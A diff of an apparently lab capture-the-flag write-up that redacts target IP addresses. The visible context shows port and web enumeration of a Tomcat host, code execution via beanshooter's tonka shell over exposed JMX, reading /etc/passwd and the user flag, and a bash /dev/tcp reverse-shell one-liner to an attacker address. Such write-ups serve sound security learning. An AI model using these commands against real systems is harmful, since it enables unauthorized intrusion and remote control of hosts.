@@ -25,7 +25,7 @@ I always begin by enumerating every TCP port to catch anything that isn’t on t
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 23:36 CEST
 Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 75.05% done; ETC: 23:36 (0:00:03 remaining)
-Nmap scan report for 10.129.113.154
+Nmap scan report for 10.129.xx.xx
 Host is up (0.10s latency).
 Not shown: 64558 closed tcp ports (reset), 972 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -47,7 +47,7 @@ Scripts and versions.
    1   │ 
    2   │ [*] Extracting information...
    3   │ 
-   4   │     [*] IP Address: 10.129.113.154
+   4   │     [*] IP Address: 10.129.xx.xx
    5   │     [*] Open ports: 22,2222,8080,33141,45501
    6   │ 
    7   │ [*] Ports copied to clipboard
@@ -57,7 +57,7 @@ Scripts and versions.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 23:39 CEST
 Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 99.86% done; ETC: 23:40 (0:00:00 remaining)
-Nmap scan report for 10.129.113.154
+Nmap scan report for 10.129.xx.xx
 Host is up (0.10s latency).
 
 PORT      STATE SERVICE    VERSION
@@ -106,7 +106,7 @@ I brute-forced paths to establish what was exposed and to learn the site’s “
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
 by Ben "epi" Risher 🤓                 ver: 2.11.0
 ───────────────────────────┬──────────────────────
- 🎯  Target Url            │ http://10.129.113.154:8080
+ 🎯  Target Url            │ http://10.129.xx.xx:8080
  🚀  Threads               │ 50
  📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
  👌  Status Codes          │ All Status Codes!
@@ -121,32 +121,32 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
  🏁  Press [ENTER] to use the Scan Management Menu™
 ──────────────────────────────────────────────────
 404      GET        1l       68w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/RELEASE-NOTES.txt
-200      GET      398l      788w     5584c http://10.129.113.154:8080/tomcat.css
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/api/index.html
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/cluster-howto.html
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/deployer-howto.html
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/config
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/jndi-datasource-examples-howto.html
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/appdev
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/realm-howto.html
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/changelog.html
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/manager-howto.html
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/setup.html
-403      GET       27l       89w      877c http://10.129.113.154:8080/docs/security-howto.html
-403      GET       73l      389w     3022c http://10.129.113.154:8080/host-manager/html
-403      GET       83l      433w     3446c http://10.129.113.154:8080/manager/html
-403      GET       83l      433w     3446c http://10.129.113.154:8080/manager/status
-302      GET        0l        0w        0c http://10.129.113.154:8080/docs => http://10.129.113.154:8080/docs/
-200      GET       22l       93w    42556c http://10.129.113.154:8080/favicon.ico
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/RELEASE-NOTES.txt
+200      GET      398l      788w     5584c http://10.129.xx.xx:8080/tomcat.css
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/api/index.html
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/cluster-howto.html
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/deployer-howto.html
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/config
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/jndi-datasource-examples-howto.html
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/appdev
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/realm-howto.html
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/changelog.html
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/manager-howto.html
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/setup.html
+403      GET       27l       89w      877c http://10.129.xx.xx:8080/docs/security-howto.html
+403      GET       73l      389w     3022c http://10.129.xx.xx:8080/host-manager/html
+403      GET       83l      433w     3446c http://10.129.xx.xx:8080/manager/html
+403      GET       83l      433w     3446c http://10.129.xx.xx:8080/manager/status
+302      GET        0l        0w        0c http://10.129.xx.xx:8080/docs => http://10.129.xx.xx:8080/docs/
+200      GET       22l       93w    42556c http://10.129.xx.xx:8080/favicon.ico
 403      GET       27l       89w      877c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET      967l     1204w    67795c http://10.129.113.154:8080/tomcat.svg
-200      GET      198l      490w    11219c http://10.129.113.154:8080/
+200      GET      967l     1204w    67795c http://10.129.xx.xx:8080/tomcat.svg
+200      GET      198l      490w    11219c http://10.129.xx.xx:8080/
 403      GET       73l      389w     3022c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 403      GET       27l       89w      865c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 403      GET       83l      433w     3446c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-302      GET        0l        0w        0c http://10.129.113.154:8080/manager => http://10.129.113.154:8080/manager/
-302      GET        0l        0w        0c http://10.129.113.154:8080/examples => http://10.129.113.154:8080/examples/
+302      GET        0l        0w        0c http://10.129.xx.xx:8080/manager => http://10.129.xx.xx:8080/manager/
+302      GET        0l        0w        0c http://10.129.xx.xx:8080/examples => http://10.129.xx.xx:8080/examples/
 ```
 
 No juicy custom apps turned up-just Tomcat defaults and Manager endpoints behind access control. That nudged me back to the RMI/JMX surface for a potential foothold.
@@ -370,9 +370,9 @@ Deploy the primitive:
 Spawn the Tonka Shell:
 ```bash
 ❯ java -jar /opt/beanshooter-4.1.0-jar-with-dependencies.jar tonka shell $target 2222
-[tomcat@10.129.234.57 /]$ id
+[tomcat@10.129.xx.xx /]$ id
 uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
-[tomcat@10.129.234.57 /]$
+[tomcat@10.129.xx.xx /]$
 ```
 
 Achieved a reverse shell.
@@ -380,7 +380,7 @@ Achieved a reverse shell.
 #### User flag
 We can check the home directory of tomcat reading the `/etc/passwd` file:
 ```
-[tomcat@10.129.234.57 /home]$ [tomcat@10.129.234.57 /home]$ cat /etc/passwd
+[tomcat@10.129.xx.xx /home]$ [tomcat@10.129.xx.xx /home]$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -426,7 +426,7 @@ tomcat:x:1001:1001::/opt/tomcat:/bin/false
 
 The user flag is at `/opt/tomcat/user.txt`:
 ```
-[tomcat@10.129.234.57 /home]$ cat /opt/tomcat/user.txt
+[tomcat@10.129.xx.xx /home]$ cat /opt/tomcat/user.txt
 <REDACTED>
 ```
 
@@ -444,7 +444,7 @@ On my box:
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/sessions/manage~10.129.234.57-Linux-x86_64/2025_10_07-00_07_47-744.log 📜
+[+] Logging to /home/kali/.penelope/sessions/manage~10.129.xx.xx-Linux-x86_64/2025_10_07-00_07_47-744.log 📜
 ────────────────────────────────────────────────────────────────────────────────
 tomcat@manage:/home$ 
 ```
@@ -452,7 +452,7 @@ tomcat@manage:/home$
 From the Tonka shell:
 
 ```bash
-[tomcat@10.129.234.57 /home]$ bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'
+[tomcat@10.129.xx.xx /home]$ bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'
 ```
 
 Penelope automatically updates the shell. I got a post talking about this tool already.
